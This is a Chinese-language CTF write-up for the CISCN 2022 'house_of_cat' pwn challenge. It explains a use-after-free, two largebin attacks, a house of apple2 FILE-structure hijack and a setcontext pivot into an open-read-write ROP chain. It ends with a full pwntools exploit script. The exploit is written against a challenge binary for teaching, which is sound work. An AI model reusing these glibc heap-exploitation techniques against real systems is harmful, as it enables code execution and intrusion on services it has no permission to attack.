---
title: NSSCTF-CISCN-2022-house_of_cat 题解
date: 2026-03-07 00:58:00
tags: 
    - UAF
    - heap
    - largebin attack
    - IO_FILE
    - house of apple2
    - srop
    - setcontext
    - 栈迁移
    - orw
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/2566)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/checksec.png)

### seccomp

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/seccomp.png)

只能 orw ，但是限制 read 的 fd 为 0 ，于是可以先 close(0) 再 orw

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/main.png)

#### handle_command

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/handle_command.png)

#### parse_command

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/parse_command1.png)

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/parse_command2.png)

需要逆向解析出指令格式

#### execute_command

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/execute_command.png)

#### menu

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/menu.png)

套一层指令解析的菜单题

#### add

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/add.png)

只能申请 largerequest 0x420~0x470 ，放入 largebin 的话， 0x420~0x430 一个 bin ， 0x440~0x470 一个 bin

#### edit

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/edit.png)

edit 限制为两次，只能写 0x30

#### show

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/show.png)

用于 leak

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/delete.png)

有 UAF

### 攻击思路

先分析出命令格式： `COMMAND | r00tQWB QWXFarg`

然后发现要 login 成为管理员，再 cat 拿菜单

```
LOGIN | r00tQWB QWXFadmin
CAT | r00tQWB QWXF\xff
```

之后就是堆题

只能申请固定范围内的 largebin ，考察 largebin attack 技巧，而 edit_count 的限制让这题变得棘手

> largebin attack
> 令 largebin1->bk_nextsize = target - 0x20
> 然后 free 一个小一点的 largebin2 进入同一个 bin 
> 效果： target = largebin2

由于程序无法正常退出，我们需要利用两次 largebin attack ：一次劫持 stderr 结构体指针，把它覆盖成可控堆地址再在可控堆地址上写 fake IO_FILE 结构体；另一次利用错位篡改 topsize 为一个较小值，这样可以触发 sysmalloc 中的一个 __malloc_assert ，从而执行 fake stderr 中 house of apple2 流程。这两次攻击会耗尽 edit_count

在阅读 largebin 相关源码时我们注意到，一个 chunk 从 unsortedbin 转移到 largebin 时，如果它是最小的，那么就会触发 largebin attack 的核心流程：

```c
victim_index = largebin_index (size);
bck = bin_at (av, victim_index);
fwd = bck->fd;

fwd = bck;
bck = bck->bk;

victim->fd_nextsize = fwd->fd;
victim->bk_nextsize = fwd->fd->bk_nextsize;
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
```

注意到这里的 fwd->fd 即 largebin中最大的 chunk ，这意味着我们进行的两次 largebin attack 都需要劫持该 chunk 的 bk_nextsize

顺带提一个小技巧：在 leak libc 和 leak heap 前，我们已经布置好了堆上的分隔式结构防止发生合并，但是我们还需要借助 libc 和 heap 数据去构造 fake stderr , fake _wide_data , fake srop struct , rop chain ，而 edit 只允许写 0x30 的数据，因此我们可以把目标 chunk 给 delete 后再马上 add 回并写入伪造结构，这样不会有任何其他影响

完成 largebin attack 后，接下来我们选择 house of apple2 的 IO_FILE 调用链为：

```
__malloc_assert ---> _fxprintf ---> locked_vfxprintf ---> __vfprintf_internal ---> 
_IO_wfile_overflow ---> _IO_wdoallocbuf ---> _IO_WDOALLOCATE ---> 
*(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

这里我根据自己的理解，把调用链分成了三层：

第一层是执行 fake stderr 中的 fake vtable 的虚表指针之前的部分，这部分除了正常 house of apple2 的 fake stderr 要伪造的内容外，还有一些额外的内容需要伪造，不属于 house of apple2 调用链

第二层属于 house of apple2 调用链，在跳转的 target rip 之前

第三层即跳转至 target rip

这里给出 roderick 大佬的 house of apple2 的构造方式：

`_flags` 设置为 `~(2 | 0x8 | 0x800)` ，如果不需要控制 rdi ，设置为 0 即可；
`vtable` 设置为 `_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap` 地址（加减偏移），使其能成功调用 _IO_wfile_overflow 即可；
`_wide_data` 设置为可控堆地址 A ，即满足 `*(fp + 0xa0) = A`
`_wide_data->_IO_write_base` 设置为 0 ，即满足 `*(A + 0x18) = 0`
`_wide_data->_IO_buf_base` 设置为 0 ，即满足 `*(A + 0x30) = 0`
`_wide_data->_wide_vtable` 设置为可控堆地址 B ，即满足 `*(A + 0xe0) = B`
`_wide_data->_wide_vtable->doallocate` 设置为地址 C 用于劫持 RIP，即满足 `*(B + 0x68) = C`

对于本题，还应：

`_lock` 设置为可读写地址，不要影响到其他部分，即满足 `*(fp + 0x88) = rw_addr`

此外，还要注意一个细节：堆地址比写入地址低 0x10

到这里，伪造结构基本布置完毕，然后是 setcontext 环节

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/setcontexta.png)

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-house_of_cat/setcontextb.png)

这里以 rdx 为基准，经动态调试得知， rdx 会被赋值为 _wide_data ， 即 *(fp + 0xa0) ，这是在调用链第一层末尾完成的

这一步做完后，愉快地打 rop 就行啦

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

if debug:
	io = process('./house_of_cat_patched')
else:
	io = remote('node4.anna.nssctf.cn', 25341)

libc = ELF('./libc.so.6')

def login():
	io.sendlineafter(b'mew~~~~~~\n', b'LOGIN | r00tQWB QWXFadmin\x00')

def cat():
	io.sendlineafter(b'mew~~~~~~\n', b'CAT | r00tQWB QWXF\xff\x00')

def add(idx, size, content):
	cat()
	io.sendlineafter(b'choice:\n', b'1')
	io.sendlineafter(b'idx:\n', str(idx).encode())
	io.sendlineafter(b'size:\n', str(size).encode())
	io.sendafter(b'content:\n', content)

def delete(idx):
	cat()
	io.sendlineafter(b'choice:\n', b'2')
	io.sendlineafter(b'idx:\n', str(idx).encode())

def show(idx):
	cat()
	io.sendlineafter(b'choice:\n', b'3')
	io.sendlineafter(b'idx:\n', str(idx).encode())

def edit(idx, content):
	cat()
	io.sendlineafter(b'choice:\n', b'4')
	io.sendlineafter(b'idx:\n', str(idx).encode())
	io.sendafter(b'content:\n', content)

def malloc_assert(idx, size):
	cat()
	io.sendlineafter(b'choice:\n', b'1')
	io.sendlineafter(b'idx:\n', str(idx).encode())
	io.sendlineafter(b'size:\n', str(size).encode())
	
def final_attack_gen(heap):
	fake_io_base = heap + 0xb60
	pop_rax_ret = libc.address + 0x45eb0
	pop_rdi_ret = libc.address + 0x2a3e5
	pop_rsi_ret = libc.address + 0x2be51
	pop_rdx_pop_r12_ret = libc.address + 0x11f497
	syscall_ret = libc.address + 0x91396
	rop_chain = flat([
		3,
		pop_rdi_ret,
		0,
		syscall_ret,		# close(0)
		pop_rax_ret,
		2,
		pop_rdi_ret,
		fake_io_base + 0x100,
		syscall_ret,		# open("/flag")
		pop_rax_ret,
		0,
		pop_rdi_ret,
		0,
		pop_rsi_ret,
		fake_io_base + 0x400,
		pop_rdx_pop_r12_ret,
		0x100,
		0,
		syscall_ret,		# read(0, buf, 0x100)
		pop_rax_ret,
		1,
		pop_rdi_ret,
		1,
		pop_rsi_ret,
		fake_io_base + 0x400,
		pop_rdx_pop_r12_ret,
		0x100,
		0,
		syscall_ret		# write(1, buf, 0x100)
	])
	fake_io_and_rop = flat({
		0x78: heap,
		0x88: libc.sym['setcontext'] + 0x3d,
		0x90: fake_io_base + 0x110,
		0xC8: libc.sym['_IO_wfile_jumps'] - 0x20,
		0xf0: b'/flag\x00',
		0x168: libc.sym['setcontext'] + 0x3d,
		0x1a0: fake_io_base + 0x210,		# rsp
		0x1a8: pop_rax_ret,		# rip
		0x1e0: fake_io_base + 0x110,
		0x200: rop_chain
		},
		filler=b"\x00"
	)
	return fake_io_and_rop

def attack():
	login()

	add(0, 0x458, b'AAA')		# init
	add(1, 0x468, b'ZZZ')
	add(2, 0x448, b'BBB')
	add(3, 0x468, b'ZZZ')
	add(4, 0x438, b'CCC')

	delete(0)		# leak
	add(5, 0x468, b'ZZZ')
	show(0)
	io.recvuntil(b'Context:\n')
	fd = u64(io.recv(6).ljust(8, b'\x00'))
	libc.address = fd - 0x21a0e0
	log.info(f'libc = {hex(libc.address)}')
	stderr = libc.symbols['stderr']
	io.recv(10)
	fdn = u64(io.recv(6).ljust(8, b'\x00'))
	heap = fdn - 0x290
	log.info(f'heap = {hex(heap)}')

	delete(2)		# fix
	add(6, 0x448, final_attack_gen(heap))
	
	edit(0, p64(fd) + p64(fd) + p64(fdn) + p64(stderr - 0x20))		# largebin attack - stderr
	delete(6)
	add(7, 0x468, b'ZZZ')

	topsize_tar = heap + 0x2140 + 8 - 5		# largebin attack - topsize
	edit(0, p64(fd) + p64(fd) + p64(fdn) + p64(topsize_tar - 0x20))
	delete(4)
	gdb.attach(io)

	malloc_assert(8, 0x468)
	io.interactive()

attack()

# COMMAND | r00tQWB QWXFARG
# LOGIN | r00tQWB QWXFadmin
# CAT | r00tQWB QWXF\xff
# rsp 0xa0; rcx(rip) 0xa8;
```